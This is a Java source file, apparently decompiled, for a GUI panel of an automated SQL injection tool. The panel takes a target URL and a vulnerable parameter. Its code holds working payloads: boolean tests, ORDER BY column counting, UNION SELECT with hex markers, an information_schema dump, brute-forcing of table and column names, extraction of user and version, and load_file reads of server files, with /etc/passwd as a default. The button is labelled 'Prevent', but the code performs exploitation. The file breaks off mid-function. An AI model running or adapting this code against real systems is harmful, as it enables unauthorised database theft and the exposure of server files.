package gui;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Vector;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.table.TableCellRenderer;
import prog.Column;
import prog.ExploitingThread;
import prog.TableRow;
import websphinx.Link;
import websphinx.Page;







public class ExploitPanel
  extends JPanel
{
  MainFrame parent;
  JPanel targetPanel;
  JPanel optionsPanel;
  JPanel resultsPanel;
  GridBagLayout globalLayout;
  GridBagLayout targetLayout;
  GridBagLayout optionsLayout;
  GridBagLayout resultsLayout;
  GridBagConstraints cTar;
  GridBagConstraints cOpt;
  GridBagConstraints cRes;
  GridBagConstraints cGlob;
  JLabel urlLabel;
  JTextField urlField;
  JLabel paramLabel;
  JTextField paramField;
  JLabel defaultLabel;
  JTextField defaultField;
  JLabel restLabel;
  JTextField restField;
  JLabel typeLabel;
  JComboBox typeBox;
  JLabel methodLabel;
  JComboBox methodBox;
  JLabel infoLabel;
  JCheckBox infoBox;
  JLabel dumpLabel;
  JCheckBox bruteForceBox;
  JTextField dicoField;
  JButton dicoButton;
  JLabel userLabel;
  JCheckBox userBox;
  JLabel fileLabel;
  JTextField fileField;
  JButton exploitButton;
  JScrollPane resPane;
  JTextArea results;
  JTable tableTable;
  CustomCellRenderer cellRenderer;
  ResultsTableModel tableModel;
  JScrollPane tableScrollPane;
  int nbCols;
  int dispCol;
  int type;
  int method;
  String param;
  String value;
  String rest;
  String url;
  Vector<String> bruteTables;
  Vector<String> bruteCols;
  
  public ExploitPanel(MainFrame parent)
  {
/* 102 */     this.parent = parent;
/* 103 */     init();
  }
  
  public void init() {
/* 107 */     this.targetPanel = new JPanel();
				targetPanel.setBackground(Color.orange);
/* 108 */     this.targetPanel.setBorder(BorderFactory.createTitledBorder("Target"));
		
/* 109 */     this.optionsPanel = new JPanel();
				optionsPanel.setBackground(Color.green);
/* 110 */     this.optionsPanel.setBorder(BorderFactory.createTitledBorder("Options"));
/* 111 */     this.resultsPanel = new JPanel();
				resultsPanel.setBackground(Color.orange);
/* 112 */     this.resultsPanel.setBorder(BorderFactory.createTitledBorder("Results"));
    




/* 118 */     this.targetLayout = new GridBagLayout();
/* 119 */     this.cTar = new GridBagConstraints();
/* 120 */     this.targetPanel.setLayout(this.targetLayout);
/* 121 */     this.cTar.anchor = 19;
/* 122 */     this.cTar.fill = 2;
/* 123 */     this.cTar.gridx = 0;
/* 124 */     this.cTar.gridy = 0;
/* 125 */     this.cTar.weightx = 0.2D;
/* 126 */     this.cTar.weighty = 0.0D;
    
/* 128 */     this.urlLabel = new JLabel("URL :");
/* 129 */     this.targetLayout.setConstraints(this.urlLabel, this.cTar);
/* 130 */     this.urlField = new JTextField("http://");
/* 131 */     this.cTar.gridx = 1;
/* 132 */     this.cTar.gridwidth = 3;
/* 133 */     this.cTar.weightx = 0.8D;
/* 134 */     this.targetLayout.setConstraints(this.urlField, this.cTar);
    
/* 136 */     this.cTar.weightx = 0.2D;
/* 137 */     this.cTar.gridwidth = 1;
/* 138 */     this.cTar.gridx = 0;
/* 139 */     this.cTar.gridy = 1;
/* 140 */     this.paramLabel = new JLabel("Vulnerable parameter :");
/* 141 */     this.paramField = new JTextField("");
/* 142 */     this.defaultLabel = new JLabel("Default value :");
/* 143 */     this.defaultField = new JTextField("");
/* 144 */     this.targetLayout.setConstraints(this.paramLabel, this.cTar);
/* 145 */     this.cTar.weightx = 0.8D;
/* 146 */     this.cTar.gridx = 1;
/* 147 */     this.targetLayout.setConstraints(this.paramField, this.cTar);
/* 148 */     this.cTar.gridx = 2;
/* 149 */     this.targetLayout.setConstraints(this.defaultLabel, this.cTar);
/* 150 */     this.cTar.gridx = 3;
/* 151 */     this.targetLayout.setConstraints(this.defaultField, this.cTar);
    
/* 153 */     this.cTar.gridx = 0;
/* 154 */     this.cTar.gridy = 2;
    
/* 156 */     this.restLabel = new JLabel("Other arguments :");
/* 157 */     this.restField = new JTextField("");
/* 158 */     this.targetLayout.setConstraints(this.restLabel, this.cTar);
/* 159 */     this.cTar.gridx = 1;
/* 160 */     this.cTar.gridwidth = 3;
/* 161 */     this.targetLayout.setConstraints(this.restField, this.cTar);
    
/* 163 */     this.cTar.gridwidth = 1;
/* 164 */     this.cTar.gridx = 0;
/* 165 */     this.cTar.gridy = 3;
/* 166 */     this.methodLabel = new JLabel("Method :");
/* 167 */     this.methodBox = new JComboBox();
/* 168 */     this.methodBox.addItem("GET");
/* 169 */     this.methodBox.addItem("POST");
/* 170 */     this.typeLabel = new JLabel("Injection Type :");
/* 171 */     this.typeBox = new JComboBox();
/* 172 */     this.typeBox.addItem("Numerical without comments");
/* 173 */     this.typeBox.addItem("Numerical with comments");
/* 174 */     this.typeBox.addItem("Literal without comments");
/* 175 */     this.typeBox.addItem("Literal with comments");
/* 176 */     this.targetLayout.setConstraints(this.methodLabel, this.cTar);
/* 177 */     this.cTar.gridx = 1;
/* 178 */     this.targetLayout.setConstraints(this.methodBox, this.cTar);
/* 179 */     this.cTar.gridx = 2;
/* 180 */     this.targetLayout.setConstraints(this.typeLabel, this.cTar);
/* 181 */     this.cTar.gridx = 3;
/* 182 */     this.targetLayout.setConstraints(this.typeBox, this.cTar);
    
/* 184 */     this.cTar.gridx = 0;
/* 185 */     this.cTar.gridy = 4;
/* 186 */     this.cTar.gridwidth = 4;
/* 187 */     this.cTar.fill = 0;
/* 188 */     this.cTar.insets = new Insets(10, 0, 0, 0);
/* 189 */     this.exploitButton = new JButton("Prevent !");
/* 190 */     this.exploitButton.addActionListener(new ActionListener()
    {
      public void actionPerformed(ActionEvent e) {
/* 193 */         new ExploitingThread(ExploitPanel.this).start();
			File file = new File("nonvulnerable.txt");
			FileWriter fw = null;
			try {
				fw = new FileWriter(file);
				for (String s : CustomTableModel.links) {
					fw.write(s + "\n");
				}
			} catch (IOException e1) {
				e1.printStackTrace();
			} finally {
				try {
					fw.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
			
//			CrawlTimeGraph crawl = new CrawlTimeGraph("Crawl Time Graph");
//			crawl.main1();
			
//			TestTimeGraph testTimeGraph = new TestTimeGraph("Test Time Graph");
//			testTimeGraph.main1();

      }
      

/* 198 */     });
/* 199 */     this.targetPanel.add(this.urlLabel);
/* 200 */     this.targetPanel.add(this.urlField);
/* 201 */     this.targetPanel.add(this.paramLabel);
/* 202 */     this.targetPanel.add(this.paramField);
/* 203 */     this.targetPanel.add(this.defaultLabel);
/* 204 */     this.targetPanel.add(this.defaultField);
/* 205 */     this.targetPanel.add(this.restLabel);
/* 206 */     this.targetPanel.add(this.restField);
/* 207 */     this.targetPanel.add(this.methodLabel);
/* 208 */     this.targetPanel.add(this.methodBox);
/* 209 */     this.targetPanel.add(this.typeLabel);
/* 210 */     this.targetPanel.add(this.typeBox);
    




/* 216 */     this.optionsLayout = new GridBagLayout();
/* 217 */     this.cOpt = new GridBagConstraints();
/* 218 */     this.optionsPanel.setLayout(this.optionsLayout);
/* 219 */     this.cOpt.gridx = 0;
/* 220 */     this.cOpt.gridy = 0;
/* 221 */     this.cOpt.weightx = 1.0D;
/* 222 */     this.cOpt.fill = 2;
/* 223 */     this.cOpt.anchor = 23;
/* 224 */     this.infoLabel = new JLabel("Get all database information :");
/* 225 */     this.infoBox = new JCheckBox();
/* 226 */     this.infoBox.setSelected(true);
/* 227 */     this.optionsLayout.setConstraints(this.infoLabel, this.cOpt);
/* 228 */     this.cOpt.gridx = 1;
/* 229 */     this.cOpt.weightx = 0.0D;
/* 230 */     this.optionsLayout.setConstraints(this.infoBox, this.cOpt);
    
/* 232 */     this.cOpt.gridx = 2;
/* 233 */     this.dumpLabel = new JLabel("Bruteforce table/col names if necessary :");
/* 234 */     this.bruteForceBox = new JCheckBox();
/* 235 */     this.bruteForceBox.setSelected(true);
/* 236 */     this.cOpt.weightx = 1.0D;
/* 237 */     this.optionsLayout.setConstraints(this.dumpLabel, this.cOpt);
/* 238 */     this.cOpt.gridx = 3;
/* 239 */     this.cOpt.weightx = 0.0D;
/* 240 */     this.optionsLayout.setConstraints(this.bruteForceBox, this.cOpt);
/* 241 */     this.dicoField = new JTextField("");
/* 242 */     this.dicoButton = new JButton("Browse...");
/* 243 */     this.dicoButton.setPreferredSize(new Dimension(100, 19));
/* 244 */     this.dicoButton.addActionListener(new ActionListener() {
      public void actionPerformed(ActionEvent ae) {
/* 246 */         JFileChooser fileChooser = new JFileChooser();
/* 247 */         int returnValue = fileChooser.showOpenDialog(null);
/* 248 */         if (returnValue == 0) {
/* 249 */           File selectedFile = fileChooser.getSelectedFile();
/* 250 */           ExploitPanel.this.dicoField.setText(selectedFile.getAbsolutePath());
        }
      }
/* 253 */     });
/* 254 */     this.cOpt.gridx = 2;
/* 255 */     this.cOpt.gridy = 1;
/* 256 */     this.cOpt.weightx = 1.0D;
/* 257 */     this.optionsLayout.setConstraints(this.dicoField, this.cOpt);
/* 258 */     this.cOpt.gridx = 3;
/* 259 */     this.cOpt.weightx = 0.0D;
/* 260 */     this.optionsLayout.setConstraints(this.dicoButton, this.cOpt);
/* 261 */     this.cOpt.anchor = 10;
/* 262 */     this.cOpt.gridx = 0;
/* 263 */     this.cOpt.gridy = 1;
    
/* 265 */     this.userLabel = new JLabel("Retrieve user and database information :");
/* 266 */     this.userBox = new JCheckBox();
/* 267 */     this.userBox.setSelected(true);
/* 268 */     this.optionsLayout.setConstraints(this.userLabel, this.cOpt);
/* 269 */     this.cOpt.gridx = 1;
/* 270 */     this.optionsLayout.setConstraints(this.userBox, this.cOpt);
    
/* 272 */     this.cOpt.gridx = 0;
/* 273 */     this.cOpt.gridy = 2;
/* 274 */     this.cOpt.gridwidth = 4;
/* 275 */     this.fileLabel = new JLabel("Enter files you wish to retrieve from server :");
/* 276 */     this.fileField = new JTextField("/etc/passwd;/etc/apache2/apache2.conf");
/* 277 */     this.optionsLayout.setConstraints(this.fileLabel, this.cOpt);
/* 278 */     this.cOpt.gridy = 3;
/* 279 */     this.cOpt.fill = 2;
/* 280 */     this.optionsLayout.setConstraints(this.fileField, this.cOpt);
/* 281 */     this.cOpt.gridy = 4;
/* 282 */     this.cOpt.fill = 0;
/* 283 */     this.optionsLayout.setConstraints(this.exploitButton, this.cOpt);
    

/* 286 */     this.optionsPanel.add(this.infoLabel);
/* 287 */     this.optionsPanel.add(this.infoBox);
/* 288 */     this.optionsPanel.add(this.dumpLabel);
/* 289 */     this.optionsPanel.add(this.bruteForceBox);
/* 290 */     this.optionsPanel.add(this.dicoField);
/* 291 */     this.optionsPanel.add(this.dicoButton);
/* 292 */     this.optionsPanel.add(this.userLabel);
/* 293 */     this.optionsPanel.add(this.userBox);
/* 294 */     this.optionsPanel.add(this.fileLabel);
/* 295 */     this.optionsPanel.add(this.fileField);
/* 296 */     this.optionsPanel.add(this.exploitButton);
    




/* 302 */     this.resultsLayout = new GridBagLayout();
/* 303 */     this.cRes = new GridBagConstraints();
/* 304 */     this.resultsPanel.setLayout(this.resultsLayout);
/* 305 */     this.cRes.fill = 1;
/* 306 */     this.cRes.anchor = 19;
/* 307 */     this.cRes.weighty = 0.5D;
/* 308 */     this.cRes.weightx = 1.0D;
/* 309 */     this.cRes.gridx = 0;
/* 310 */     this.cRes.gridy = 0;
/* 311 */     this.results = new JTextArea("Results will be displayed here...");
/* 312 */     this.results.setBorder(BorderFactory.createBevelBorder(1));
/* 313 */     this.resPane = new JScrollPane(this.results);
/* 314 */     this.resPane.setPreferredSize(new Dimension(200, 100));
/* 315 */     this.resultsLayout.setConstraints(this.resPane, this.cRes);
    
/* 317 */     this.tableModel = new ResultsTableModel(this);
    

/* 320 */     this.tableTable = new JTable(this.tableModel);
/* 321 */     TableCellRenderer defaultRenderer = this.tableTable.getDefaultRenderer(JButton.class);
/* 322 */     this.tableTable.setDefaultRenderer(JButton.class, 
/* 323 */       new CustomCellRenderer(defaultRenderer));
/* 324 */     this.tableTable.addMouseListener(new JTableButtonMouseListener(this.tableTable));
/* 325 */     this.tableScrollPane = new JScrollPane(this.tableTable);
/* 326 */     this.tableScrollPane.setPreferredSize(new Dimension(200, 100));
/* 327 */     this.cRes.gridy = 1;
/* 328 */     this.cRes.weighty = 0.5D;
/* 329 */     this.cRes.fill = 2;
/* 330 */     this.cRes.anchor = 19;
/* 331 */     this.resultsLayout.setConstraints(this.tableScrollPane, this.cRes);
    
/* 333 */     this.resultsPanel.add(this.resPane);
/* 334 */     this.resultsPanel.add(this.tableScrollPane);
    


/* 338 */     this.globalLayout = new GridBagLayout();
/* 339 */     this.cGlob = new GridBagConstraints();
/* 340 */     this.cGlob.gridx = 0;
/* 341 */     this.cGlob.gridy = 0;
/* 342 */     this.cGlob.anchor = 19;
/* 343 */     this.cGlob.fill = 1;
/* 344 */     this.cGlob.weightx = 1.0D;
/* 345 */     setLayout(this.globalLayout);
/* 346 */     this.globalLayout.setConstraints(this.targetPanel, this.cGlob);
/* 347 */     this.cGlob.gridy = 1;
/* 348 */     this.globalLayout.setConstraints(this.optionsPanel, this.cGlob);
/* 349 */     this.cGlob.gridy = 2;
/* 350 */     this.cGlob.weighty = 1.0D;
/* 351 */     this.globalLayout.setConstraints(this.resultsPanel, this.cGlob);
    
/* 353 */     add(this.targetPanel);
/* 354 */     add(this.optionsPanel);
/* 355 */     add(this.resultsPanel);
  }
  
  public void setParams(String URL, String param, String defaultValue, String rest, int type, int method) {
/* 359 */     this.urlField.setText(URL);
/* 360 */     this.paramField.setText(param);
/* 361 */     this.defaultField.setText(defaultValue);
/* 362 */     this.restField.setText(rest);
/* 363 */     if (type > 0)
/* 364 */       this.typeBox.setSelectedIndex(type - 1);
/* 365 */     this.methodBox.setSelectedIndex(method);
  }
  
  public String postPage(String urlstring) {
/* 369 */     String ret = "";
/* 370 */     String query = "";
/* 371 */     String base = "";
/* 372 */     if (urlstring.indexOf('?') == urlstring.lastIndexOf('?'))
    {
/* 374 */       base = urlstring.substring(0, urlstring.indexOf('?'));
/* 375 */       query = urlstring.substring(urlstring.indexOf('?') + 1);
    }
    else {
/* 378 */       base = urlstring.substring(0, urlstring.lastIndexOf('?'));
/* 379 */       query = urlstring.substring(urlstring.lastIndexOf('?') + 1);
    }
    try
    {
/* 383 */       String data = "";
      
/* 385 */       String[] params = query.split("&");
      
/* 387 */       for (int i = 0; i < params.length; i++) {
/* 388 */         if (params[i].indexOf('=') > -1) {
/* 389 */           String name = params[i].substring(0, params[i].indexOf('='));
/* 390 */           if (!name.equals("")) {
/* 391 */             String value = params[i].substring(params[i].indexOf('=') + 1);
/* 392 */             data = data + name + "=" + value;
/* 393 */             data = data + "&";
          }
        }
      }
      


/* 400 */       URL url = new URL(base);
/* 401 */       URLConnection conn = url.openConnection();
/* 402 */       conn.setDoOutput(true);
/* 403 */       OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
/* 404 */       wr.write(data);
/* 405 */       wr.flush();
      

/* 408 */       BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
      String line;
/* 410 */       while ((line = rd.readLine()) != null) { 
		
/* 411 */         ret = ret + line;
      }
/* 413 */       wr.close();
/* 414 */       rd.close();
    }
    catch (Exception e) {
/* 417 */       this.parent.setStatus("Unable to open " + urlstring);
    }
/* 419 */     return ret;
  }
  
  public void exploit() {
/* 423 */     this.parent.setStatus("Exploiting ...");
/* 424 */     this.results.setText("");
    
/* 426 */     this.tableModel.removeAll();
/* 427 */     this.url = this.urlField.getText();
/* 428 */     this.rest = this.restField.getText();
/* 429 */     this.param = this.paramField.getText();
/* 430 */     this.value = this.defaultField.getText();
/* 431 */     this.tableTable.removeAll();
    
/* 433 */     this.type = (this.typeBox.getSelectedIndex() + 1);
/* 434 */     this.method = this.methodBox.getSelectedIndex();
/* 435 */     this.results.setText("");
/* 436 */     if (this.type == 3) {
/* 437 */       this.results.append("Literal injections without comments are not fully implemented yet\n");
    }
/* 439 */     this.url = (this.url + "?" + this.param + "=" + this.value + "&" + this.rest);
    String payload;
//    String payload;
//    String payload;
//    String payload;
//    String payload;
/* 445 */     switch (this.type) {
    case 1: 
/* 447 */       payload = new String(" AND 1=1");
/* 448 */       break;
    case 2: 
/* 450 */       payload = new String(" AND 1=1/*");
/* 451 */       break;
    case 3: 
/* 453 */       payload = new String("' AND '1'='1");
/* 454 */       break;
    case 4: 
/* 456 */       payload = new String("' AND 1=1/*");
/* 457 */       break;
    default: 
/* 459 */       payload = new String();
    }
/* 461 */     String truePage = getPageFromUrl(this.url, this.value + payload, this.method);
    




/* 467 */     switch (this.type) {
    case 1: 
/* 469 */       payload = new String(" AND 1=2");
/* 470 */       break;
    case 2: 
/* 472 */       payload = new String(" AND 1=2/*");
/* 473 */       break;
    case 3: 
/* 475 */       payload = new String("' AND '1'='2");
/* 476 */       break;
    case 4: 
/* 478 */       payload = new String("' AND 1=2/*");
/* 479 */       break;
    default: 
/* 481 */       payload = new String();
    }
/* 483 */     String falsePage = getPageFromUrl(this.url, this.value + payload, this.method);
    




/* 489 */     if (this.type < 3) {
/* 490 */       payload = " ORDER BY 1";
    } else {
/* 492 */       payload = "' ORDER BY 1";
    }
    
/* 495 */     this.nbCols = 0;
/* 496 */     int iter = 2;
/* 497 */     String initialPage = getPageFromUrl(this.url, this.value + payload + ((this.type == 2) || (this.type == 4) ? "/*" : ""), this.method);
/* 498 */     String testPage = getPageFromUrl(this.url, this.value + payload + ((this.type == 2) || (this.type == 4) ? "/*" : ""), this.method);
/* 499 */     while (comparePages(initialPage, testPage) < 2) {
/* 500 */       payload = payload + "," + iter++;
/* 501 */       testPage = getPageFromUrl(this.url, this.value + payload + ((this.type == 2) || (this.type == 4) ? "/*" : ""), this.method);
/* 502 */       if (iter > 100) {
/* 503 */         this.results.append("\nCould not determine number of columns in initial query. Somethin went wrong");
/* 504 */         this.parent.setStatus("Error during exploitation");
/* 505 */         return;
      }
    }
/* 508 */     this.nbCols = (iter - 2);
    
/* 510 */     System.out.println("Found " + this.nbCols + " columns!");
/* 511 */     this.results.append("Found " + this.nbCols + " columns in initial query.");
    


/* 515 */     if (this.type <= 2) {
/* 516 */       payload = "-666 ";
    } else
/* 518 */       payload = "mkl543' ";
/* 519 */     boolean found = false;
/* 520 */     int colNb = 1;
/* 521 */     this.dispCol = 0;
/* 522 */     while (!found) {
/* 523 */       System.out.println(colNb);
/* 524 */       String query = payload + "UNION ALL SELECT ";
/* 525 */       for (int k = 1; k < colNb; k++)
/* 526 */         query = query + "1,";
/* 527 */       query = query + "0x585858535441525444554D50585858";
/* 528 */       for (int k = colNb + 1; k <= this.nbCols; k++)
/* 529 */         query = query + ",1";
/* 530 */       if ((this.type == 2) || (this.type == 4))
/* 531 */         query = query + "/*";
/* 532 */       testPage = getPageFromUrl(this.url, query, this.method);
/* 533 */       if (testPage.indexOf("XXXSTARTDUMPXXX") > -1) {
/* 534 */         found = true;
/* 535 */         this.dispCol = colNb;
      }
/* 537 */       if (colNb > this.nbCols) {
/* 538 */         System.out.println("No displayable column found");
/* 539 */         this.results.append("\nNo displayable column found");
/* 540 */         this.parent.setStatus("Error during exploitation");
/* 541 */         return;
      }
/* 543 */       colNb++;
    }
/* 545 */     System.out.println("Column " + this.dispCol + " is displayable!");
/* 546 */     this.results.append("\nColumn " + this.dispCol + " is displayable.");
    
/* 548 */     if (this.infoBox.isSelected())
    {


/* 552 */       String query = payload + "UNION ALL SELECT ";
/* 553 */       for (int k = 1; k < this.dispCol; k++)
/* 554 */         query = query + "1,";
/* 555 */       query = query + "concat(0x585858535441525444554D50585858,count(*),0x585858454E4444554D50585858)";
/* 556 */       for (int k = this.dispCol + 1; k <= this.nbCols; k++)
/* 557 */         query = query + ",1";
/* 558 */       query = query + " FROM information_schema.columns WHERE table_schema != 0x696E666F726D6174696F6E5F736368656D61";
/* 559 */       if ((this.type == 2) || (this.type == 4))
/* 560 */         query = query + "/*";
/* 561 */       int totalCols = 0;
/* 562 */       testPage = getPageFromUrl(this.url, query, this.method);
/* 563 */       Pattern pattern = Pattern.compile("XXXSTARTDUMPXXX(\\d+)XXXENDDUMPXXX");
/* 564 */       Matcher match = pattern.matcher(testPage);
/* 565 */       boolean info = true;
/* 566 */       if (match.find()) {
/* 567 */         totalCols = Integer.parseInt(match.group(1));
      }
/* 569 */       info = false;
/* 570 */       this.results.append("\nCould not find number of rows (information_schema not accessible)\n");
/* 571 */       if (this.bruteForceBox.isSelected()) {
/* 572 */         this.results.append("Now trying to bruteforce table names...\n");
/* 573 */         this.bruteTables = new Vector();
/* 574 */         this.bruteCols = new Vector();
        String table_name;
/* 576 */         try { BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(this.dicoField.getText())));
/* 577 */           table_name = "";
/* 578 */           while ((table_name = in.readLine()) != null) {
/* 579 */             query = payload + "UNION ALL SELECT ";
/* 580 */             for (int k = 1; k < this.dispCol; k++)
/* 581 */               query = query + "1,";
/* 582 */             query = query + "concat(0x585858535441525444554D50585858,0x585858454E4444554D50585858)";
/* 583 */             for (int k = this.dispCol + 1; k <= this.nbCols; k++)
/* 584 */               query = query + ",1";
/* 585 */             query = query + " FROM " + table_name;
/* 586 */             if ((this.type == 2) || (this.type == 4))
/* 587 */               query = query + "/*";
/* 588 */             this.parent.setStatus("Trying table " + table_name + "...");
/* 589 */             testPage = getPageFromUrl(this.url, query, this.method);
/* 590 */             pattern = Pattern.compile("XXXSTARTDUMPXXXXXXENDDUMPXXX");
/* 591 */             match = pattern.matcher(testPage);
/* 592 */             if (match.find()) {
/* 593 */               this.results.append("Found table : " + table_name + "\n");
/* 594 */               this.bruteTables.addElement(table_name);
            }
          }
          
/* 598 */           in.close();
        }
        catch (Exception e) {
/* 601 */           e.printStackTrace();
        }
/* 603 */         for (String table : this.bruteTables) {
          try {
/* 605 */             this.results.append("Bruteforcing column names for table : " + table + "\n");
/* 606 */             BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(this.dicoField.getText())));
/* 607 */             String col_name = "";
/* 608 */             while ((col_name = in.readLine()) != null)
            {
/* 610 */               query = payload + "UNION ALL SELECT ";
/* 611 */               for (int k = 1; k < this.dispCol; k++)
/* 612 */                 query = query + "1,";
/* 613 */               query = query + "concat(0x585858535441525444554D50585858,database(),0x7C7C7C," + col_name + ",0x585858454E4444554D50585858)";
/* 614 */               for (int k = this.dispCol + 1; k <= this.nbCols; k++)
/* 615 */                 query = query + ",1";
/* 616 */               query = query + " FROM " + table;
/* 617 */               if ((this.type == 2) || (this.type == 4))
/* 618 */                 query = query + "/*";
/* 619 */               this.parent.setStatus("Trying column " + col_name + "...");
/* 620 */               testPage = getPageFromUrl(this.url, query, this.method);
              




/* 626 */               pattern = Pattern.compile("XXXSTARTDUMPXXX(.+?)\\x7C\\x7C\\x7C(.+?)XXXENDDUMPXXX");
/* 627 */               match = pattern.matcher(testPage);
/* 628 */               if (match.find())
              {
/* 630 */                 this.results.append("Found column : " + col_name + " for table : " + table + "\n");
/* 631 */                 this.bruteCols.addElement(col_name);
/* 632 */                 Column c = new Column(match.group(1), table, col_name);
/* 633 */                 this.parent.addColumn(c);
/* 634 */                 this.tableModel.addRow(new TableRow(match.group(1), table, col_name));
/* 635 */                 this.tableTable.revalidate();
              }
            }
            
/* 639 */             in.close();
          }
          catch (Exception e) {
/* 642 */             e.printStackTrace();
          }
        }
      }
      





/* 652 */       if (info) {
/* 653 */         for (int i = 0; i < totalCols; i++) {
/* 654 */           query = payload + "UNION ALL SELECT ";
/* 655 */           for (int k = 1; k < this.dispCol; k++)
/* 656 */             query = query + "1,";
/* 657 */           query = query + "concat(0x585858535441525444554D50585858,table_schema,0x7C7C7C,table_name,0x7C7C7C,column_name,0x585858454E4444554D50585858)";
/* 658 */           for (int k = this.dispCol + 1; k <= this.nbCols; k++)
/* 659 */             query = query + ",1";
/* 660 */           query = query + " FROM information_schema.columns WHERE table_schema != 0x696E666F726D6174696F6E5F736368656D61 LIMIT " + i + ",1";
/* 661 */           if ((this.type == 2) || (this.type == 4))
/* 662 */             query = query + "/*";
/* 663 */           testPage = getPageFromUrl(this.url, query, this.method);
/* 664 */           pattern = Pattern.compile("XXXSTARTDUMPXXX(.+?)\\x7C\\x7C\\x7C(.+?)\\x7C\\x7C\\x7C(.+?)XXXENDDUMPXXX");
/* 665 */           match = pattern.matcher(testPage);
/* 666 */           if (match.find()) {
/* 667 */             Column c = new Column(match.group(1), match.group(2), match.group(3));
/* 668 */             this.parent.addColumn(c);
/* 669 */             this.tableModel.addRow(new TableRow(match.group(1), match.group(2), match.group(3)));
/* 670 */             this.tableTable.revalidate();
          }
          else {
/* 673 */             System.out.println("Could not determine columns. Something went wrong");
/* 674 */             this.parent.setStatus("Error during exploitation");
/* 675 */             return;
          }
        }
      }
/* 679 */       repaint();
    }
    
/* 682 */     if (this.userBox.isSelected()) {
/* 683 */       String query = payload + "UNION ALL SELECT ";
/* 684 */       for (int k = 1; k < this.dispCol; k++)
/* 685 */         query = query + "1,";
/* 686 */       query = query + "concat(0x585858535441525444554D50585858,user(),0x7C7C7C,version(),0x585858454E4444554D50585858)";
/* 687 */       for (int k = this.dispCol + 1; k <= this.nbCols; k++)
/* 688 */         query = query + ",1";
/* 689 */       if ((this.type == 2) || (this.type == 4))
/* 690 */         query = query + "/*";
/* 691 */       testPage = getPageFromUrl(this.url, query, this.method);
/* 692 */       Pattern pattern = Pattern.compile("XXXSTARTDUMPXXX(.+)XXXENDDUMPXXX");
/* 693 */       Matcher match = pattern.matcher(testPage);
      
/* 695 */       if (match.find()) {
/* 696 */         String abc = match.group(1);
/* 697 */         String[] asd = abc.split("\\x7C\\x7C\\x7C");
/* 698 */         if (asd.length == 2) {
/* 699 */           this.results.append("\nUser : " + asd[0] + "\n Version : " + asd[1]);
        }
      } else {
/* 702 */         System.out.println("Error retrieving user and version\n");
/* 703 */         this.results.append("\nError retrieving user and version\n");
      }
    }
    



/* 710 */     if (!this.fileField.getText().equals("")) {
/* 711 */       String[] filenames = this.fileField.getText().split(";");
/* 712 */       for (int i = 0; i < filenames.length; i++) {
/* 713 */         String query = payload + "UNION ALL SELECT ";
/* 714 */         for (int k = 1; k < this.dispCol; k++)
/* 715 */           query = query + "1,";
/* 716 */         query = query + "concat(0x585858535441525444554D50585858,load_file(";
/* 717 */         query = query + ascii_to_hex(filenames[i]);
/* 718 */         query = query + "),0x585858454E4444554D50585858)";
/* 719 */         for (int k = this.dispCol + 1; k <= this.nbCols; k++)
/* 720 */           query = query + ",1";
/* 721 */         if ((this.type == 2) || (this.type == 4))
/* 722 */           query = query + "/*";
/* 723 */         testPage = getPageFromUrl(this.url, query, this.method);
/* 724 */         FileContentDialog fcd; if (testPage.contains("XXXSTARTDUMPXXX")) {
/* 725 */           String fileContent = testPage.substring(testPage.indexOf("XXXSTARTDUMPXXX") + 15, testPage.indexOf("XXXENDDUMPXXX"));
/* 726 */           fcd = new FileContentDialog(this.parent, filenames[i], fileContent);
        }
        else {
/* 729 */           this.results.append("Could not open file : " + filenames[i] + "\n");
        }
      }
    }
    
/* 734 */     this.results.append("\nFinished exploiting!");
/* 735 */     this.parent.setStatus("Finished exploiting");
  }
  
  public String getPageFromUrl(String url, String query, int method) {
/* 739 */     String ret = "";
/* 740 */     if (method == 0) {
      try {
/* 742 */         ret = new Page(new Link(url.replaceFirst(this.param + "=" + this.value, this.param + "=" + query.replaceAll(" ", "%20")))).getContent();
      }
      catch (Exception e) {
/* 745 */         this.parent.setStatus("Unable to open " + url);
      }
      
    } else {
/* 749 */       ret = postPage(url.replaceFirst(this.param + "=" + this.value, this.param + "=" + query.replaceAll(" ", "+").replaceAll("'", "%27").replaceAll("=", "%3D").replaceAll("/", "%2F")));
    }
    
/* 752 */     return ret;
  }
  
  public String ascii_to_hex(String input) {
/* 756 */     String ret = "";
/* 757 */     for (int i = 0; i < input.length(); i++) {
/* 758 */       ret = ret + Integer.toHexString(input.charAt(i));
    }
/* 760 */     return "0x" + ret;
  }
  



  public void dumpTable(TableRow row)
  {
/* 768 */     DumpDialog dd = new DumpDialog(this.parent, row);
    
/* 770 */     String query = new String();
    String payload;
//    String payload;
/* 773 */     if (this.type <= 2) {
/* 774 */       payload = "-666 ";
    } else
/* 776 */       payload = "mkl543' ";
/* 777 */     query = payload + "UNION ALL SELECT ";
/* 778 */     for (int k = 0; k < this.dispCol - 1; k++)
/* 779 */       query = query + "null,";
/* 780 */     query = query + "concat(0x585858535441525444554D50585858,count(*),0x585858454E4444554D50585858)";
/* 781 */     for (int k = 0; k < this.nbCols - this.dispCol; k++)
/* 782 */       query = query + ",null";
/* 783 */     query = query + " FROM " + row.getSchemaName() + "." + row.getTableName();
/* 784 */     if ((this.type == 2) || (this.type == 4))
/* 785 */       query = query + "/*";
/* 786 */     String testPage = getPageFromUrl(this.url, query, this.method);
/* 787 */     Pattern pattern = Pattern.compile("XXXSTARTDUMPXXX(\\d+)XXXENDDUMPXXX");
/* 788 */     Matcher match = pattern.matcher(testPage);
    			int nbRows = 0;
/* 790 */     if (match.find()) {
/* 791 */       nbRows = Integer.parseInt(match.group(1));
